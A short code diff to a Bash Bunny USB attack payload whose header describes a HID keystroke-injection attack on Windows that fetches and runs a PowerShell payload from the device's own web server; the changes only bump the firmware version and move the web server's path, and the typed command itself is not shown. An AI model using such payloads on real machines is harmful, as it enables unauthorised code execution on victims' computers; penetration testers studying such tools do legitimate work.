@@ -6,7 +6,7 @@
 # Category:      Powershell
 # Target:        Windows XP SP3+ (Powershell)
 # Attackmodes:   HID, RNDIS_ETHERNET
-# Firmware:      >= 1.2
+# Firmware:      >= 1.3
 #
 # Quick HID attack to retrieve and run powershell payload from BashBunny web server - ensure psh.txt exists in payload directory
 # 
@@ -34,7 +34,7 @@ REQUIRETOOL gohttp
 
 # Start web server
 iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
-/tools/gohttp/gohttp -p 80 -d $PAYLOAD_DIR  > $SERVER_LOG 2>&1 &
+/usr/bin/gohttp -p 80 -d $PAYLOAD_DIR  > $SERVER_LOG 2>&1 &
 
 # Check for psh.txt
 if [ ! -f $PAYLOAD_DIR/psh.txt ]; then
